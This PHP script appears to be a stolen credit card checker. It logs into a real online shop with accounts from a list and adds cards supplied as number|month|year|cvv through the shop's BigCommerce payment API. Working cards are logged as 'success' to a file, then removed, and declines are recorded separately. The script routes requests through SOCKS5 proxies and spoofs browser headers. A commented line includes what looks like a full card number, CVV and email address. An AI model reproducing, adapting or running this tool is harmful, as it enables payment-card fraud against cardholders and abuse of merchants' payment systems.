<?php
error_reporting(0);
set_time_limit(0);
global $cookie;

/*****************************curl**************************************/
class curlNew
{
    public $ch, $agent, $cookiefile, $error, $info;
    public function curl()
    {
        $this->agent = $this->get_agent();
        $this->ch = curl_init();
        curl_setopt($this->ch, CURLOPT_USERAGENT, $this->agent);
        curl_setopt($this->ch, CURLOPT_HEADER, 1);
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, array('Expect:'));
    }

    public function header($headers)
    {
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
    }
    public function ssl($veryfyPeer, $verifyHost)
    {
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, $veryfyPeer);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, $verifyHost);
    }
    public function timeout($time)
    {
        //curl_setopt($this->ch, CURLOPT_DNS_CACHE_TIMEOUT, 1);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, $time);
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, $time);
    }

    public function cookie($cookie)
    {
        curl_setopt($this->ch, CURLOPT_COOKIE, $cookie);
        curl_setopt($this->ch, CURLOPT_COOKIESESSION, true);
    }

    public function cookiefile($cookie_file_path = null)
    {
        $this->cookiefile = $cookie_file_path;
        $fp = fopen($this->cookiefile, 'wb');
        fclose($fp);
        curl_setopt($this->ch, CURLOPT_COOKIEJAR, $this->cookiefile);
        curl_setopt($this->ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($this->ch, CURLOPT_COOKIESESSION, true);
    }
    public function referer($ref)
    {
        curl_setopt($this->ch, CURLOPT_REFERER, $ref);
    }
    public function proxy($sock)
    {
        $IP_U_P = multiexplode($sock);
        curl_setopt($this->ch, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($this->ch, CURLOPT_PROXY, $IP_U_P[0]);
        if ($IP_U_P[1]) {
            curl_setopt($this->ch, CURLOPT_PROXYUSERPWD, $IP_U_P[1]);
        }
    }

    public function post($url, $data, $hasHeader = true, $hasBody = true, $httpQuery)
    {
        curl_setopt($this->ch, CURLOPT_POST, 1);
        if ($httpQuery) {
            curl_setopt($this->ch, CURLOPT_POSTFIELDS, http_build_query($data));
        } else {
            curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data);
        }
        return $this->getPage($url, $hasHeader, $hasBody);
    }
    public function get($url, $hasHeader = true, $hasBody = true)
    {
        curl_setopt($this->ch, CURLOPT_POST, 0);
        return $this->getPage($url, $hasHeader, $hasBody);
    }
    public function getPage($url, $hasHeader = true, $hasBody = true)
    {
        curl_setopt($this->ch, CURLOPT_HEADER, $hasHeader);
        curl_setopt($this->ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
        curl_setopt($this->ch, CURLOPT_URL, $url);
        $data = curl_exec($this->ch);
        $this->error = curl_error($this->ch);
        $this->info = curl_getinfo($this->ch);
        return $data;
    }
    public function get_info()
    {
        return $this->info;
    }
    public function get_erorr()
    {
        return $this->error;
    }

    public function get_agent()
    {
        $z = rand(0, 9);
        return "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0";
    }
    public function close()
    {
        if (file_exists($this->cookiefile)) {
            @unlink($this->cookiefile);
        }

        curl_close($this->ch);
    }
}
/******************************************************************************/

function char_at($str, $pos)
{
    return $str{
        $pos};
}
function multiexplode($string)
{
    $delimiters = array("|", ",", "/", "\\", "[", "]");
    $ready = str_replace($delimiters, $delimiters[0], $string);

    $launch = explode($delimiters[0], $ready);

    return $launch;
}

function inStr($s, $as)
{
    $s = strtoupper($s);
    if (!is_array($as)) {
        $as = array($as);
    }

    for ($i = 0; $i < count($as); $i++) {
        if (strpos(($s), strtoupper($as[$i])) !== false) {
            return true;
        }
    }

    return false;
}

function serializePostFields($postFields)
{
    foreach ($postFields as $key => $value) {
        $value = urlencode($value);
        $postFields[$key] = "$key=$value";
    }
    $postFields = implode($postFields, '&');
    return $postFields;
}
function strToHex($string)
{
    $hex = '';
    for ($i = 0; $i < strlen($string); $i++) {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}

function hexToStr($hex)
{
    $string = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $string;
}

function get_string_between($string, $start, $end)
{
    $string = " " . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) {
        return "";
    }

    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function removeHTML($str)
{
    $ret = array();

    $str = str_replace("&nbsp;", "", $str);
    $arr = explode("|", $str);
    for ($i = 0; $i < count($arr); $i++) {
        $p = trim(strip_tags($arr[$i]));
        if (!empty($p)) {
            $ret[] = $p;
        }

    }

    return join(" | ", $ret);
}
function writetofile($file, $content)
{
    $fp = fopen($file, 'a');
    if ($fp) {
        if (is_writable($file)) {
            fwrite($fp, $content);
            fclose($fp);
        } else {
            fclose($fp);
            die("File is not writeable");
        }
    } else {
        die("Can't open file to write");
    }
}
function createtxt()
{
    $cookie_file_path = "cookies/" . md5(time() . rand(0, 999)) . "_" . rand(0, 999) .
        "_cookie.txt";
    $fp = fopen($cookie_file_path, 'wb');
    fclose($fp);
    return $cookie_file_path;
}
function writeFile($dir, $data)
{
    $fp = fopen($dir, "w");
    fwrite($fp, $data);
    fclose($fp);
}

/****************************************************************/
function regist()
{
    global $curl, $random_name, $random_surname;
    $cookie = tempnam('tmp', 'fabric' . rand(1000000, 9999999) . 'tmp.txt');
    $curl = new curlNew;
    $curl->cookiefile($cookie);
    $curl->timeout("30");
    $curl->ssl(0, 2);
    $myfile = fopen("powerlogin.txt", "r");
    $users = explode("\n", fread($myfile, filesize("powerlogin.txt")));
    $valuee = 1000 % count($users);
    $username = trim($users[$valuee]);
    $username = trim($users[rand(0, count($users) - 1)]);
    $link = "https://www.ercwipe.com/login.php?action=check_login";
    $s = $curl->get($link, 0);

    $authenticity_token = get_string_between($s, 'csrf_token":"', '"');
    $post = array(
        'authenticity_token' => $authenticity_token,
        'login_email' => $username,
        'login_pass' => '123456aa',
    );
    $s = $curl->post($link, $post, 0, 1, 0);
    echo $username . "  ";
}

/****************************************************************/
// function check($prefix, $ccn, $ccmon, $ccyear, $cvv)
function check($i, $num, $month, $year, $cvv)
{
    global $curl, $random_name, $random_surname;
	$link = "https://www.ercwipe.com/account.php?action=add_payment_method&provider=braintree&method_type=CARD";
    $s = $curl->get($link, 0);

    $shopperId = get_string_between($s, '\"shopperId\":', ',\"');
    $csrf_token = get_string_between($s, 'csrf_token":"', '"');
    $vaultToken = get_string_between($s, '"vaultToken\":\"', '\"');

    $headers = array(
        "stencil-config: {}",
        "x-xsrf-token: " . $csrf_token,
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "Accept: */*",
        "X-Requested-With: XMLHttpRequest",
        "stencil-options: {}",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
    );
    $curl->header($headers);
    $link = "https://www.ercwipe.com/remote/v1/country-states/United%20States";
    $s = $curl->get($link, 0);
    $headers = array(
        "Access-Control-Request-Method: POST",
        "Origin: https://www.mrsmeyers.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Access-Control-Request-Headers: authorization,content-type",
        "Accept: */*",
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Mode: cors",
    );
    $link = "https://payments.bigcommerce.com/stores/akig30/customers/" . $shopperId . "/stored_instruments";
    // $post = "";
    $curl->header($headers);
    $s = $curl->get($link, 0);

    $headers = array(
        "Accept: application/vnd.bc.v1+json",
        "Origin: https://www.ercwipe.com/",
        "Authorization: " . $vaultToken,
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Content-Type: application/vnd.bc.v1+json",
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Mode: cors",
    );
    $link = "https://payments.bigcommerce.com/stores/akig30/customers/" . $shopperId . "/stored_instruments";
    // $post = "{\"instrument\":{\"type\":\"card\",\"cardholder_name\":\"nano erro\",\"number\":\"4841672661277104\",\"expiry_month\":10,\"expiry_year\":2021,\"verification_value\":\"986\"},\"billing_address\":{\"address1\":\"siul bread\",\"city\":\"PORTLAND\",\"postal_code\":\"97218\",\"state_or_province_code\":\"OR\",\"country_code\":\"US\",\"first_name\":\"Tufwansoni\",\"last_name\":\"jean\",\"email\":\"Alex2275LePage@gmail.com\"},\"provider_id\":\"cybersource\",\"default_instrument\":false}";
    $post = '{"instrument":{"type":"card","cardholder_name":"nano erro","number":"' . $num . '","expiry_month":' . $month . ',"expiry_year":' . $year . ',"verification_value":"' . $cvv . '"},"billing_address":{"address1":"siul bread","city":"PORTLAND","postal_code":"97218","state_or_province_code":"OR","country_code":"US","first_name":"Tufwansoni","last_name":"jean","email":"jamarrion773@bbetweenj.com"},"provider_id":"braintree","default_instrument":false}';
    $curl->header($headers);
    $s = $curl->post($link, $post, 0, 1, 0);
    $session = json_decode($s);
    $title = $session->title;
    $id = get_string_between($s, '"id":"', '"');
    // echo $s;

    

    if (!empty($id)) {
        $myfile = fopen("livepowersuppo.txt", "a");
        $txt = "success" . '  ' . $num . "|" . $month . "|" . $year . "|" . $cvv . '     ' . date("Y-m-d h:i:sa") . PHP_EOL;
        fwrite($myfile, $txt);
        fclose($myfile);
        echo "<span class='asds'>" . ($i + 1) . " - " . '>> Good << = ' . $num . "|" . $month . "|" . $year . "|" . $cvv . "</span><br>";
        // echo "success" . " " . PHP_EOL;
        $link = "https://www.ercwipe.com/account.php?bigpay_token=" . $id . "&action=delete_payment_method&currency_code=USD";
        $post = array(
            'authenticity_token' => $csrf_token,
        );
        $s = $curl->post($link, $post, 0, 1, 0);
    }

    if (!empty($title)) {
        echo "<span class='asd'>" . ($i + 1) . " - " . '>> ' . $title . ' << = ' . $num . "|" . $month . "|" . $year . "|" . $cvv . "</span><br>";
        writetofile("powererror.txt", $title . '   ' . $num . "|" . $month . "|" . $year . "|" . $cvv . '     ' . date("Y-m-d h:i:sa") . PHP_EOL);
    }
}
/****************************************************************/

/****************************************************************/
regist();
// check($i, $num, $month, $year, $cvv);
if ($_GET['card']) {
    ////////////////
    flush();
    ob_flush();
    set_time_limit(360000);
    function ex($t, $s, $e)
    {
        $e1 = explode($s, $t);
        $e2 = explode($e, $e1[1]);
        return $e2[0];
    }
    $ex1 = explode('
', $_GET['card']);
    flush();
    ob_flush();
    //////////////////////////////////////////////////////////////////////////
    $ex = array_values($ex1);
    /////////////////////////////////////////////////
    ////echo count($ex);
    ///////////////////////
    flush();
    ob_flush();
    $acc = $ex[$i];
    /////////////////////////////////////// Open Skype
    $type = substr($num, 0, 1);
    if ($type == 5) {
        $types = '2';
    } elseif ($type == 4) {
        $types = '1';
    } elseif ($type == 3) {
        $types = '3';
    }
    /////////////////
    $time = substr(time(), 3);
    //////
    for ($i = 0; $i < count($ex); $i++) {
        $ex2 = explode('|', $_GET['card']);
        $ctype = $ex2[0];
        $num = $ex2[0];
        $month1 = $ex2[1];
        if (substr($month1, 0, 1) == '0') {
            $month = substr($month1, 1, 1);
        } else {
            $month = substr($month1, 0, 2);
        }
        $year = $ex2[2];
        $cvv = $ex2[3];
        $num1 = substr($num, 0, 4);
        $num2 = substr($num, 4, 4);
        $num3 = substr($num, 8, 4);
        $num4 = substr($num, 12, 4);
        $nums = $num1 . '+' . $num2 . '+' . $num3 . '+' . $num4;
        $type = substr($num, 0, 1);
        if ($type == 5) {
            $types = 'MasterCard';
        } elseif ($type == 4) {
            $types = 'Visa';
        } elseif ($type == 3) {
            $types = 'AMX';
        }

        check($i, $num, $month, $year, $cvv);
    }
}
flush();
ob_flush();
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///
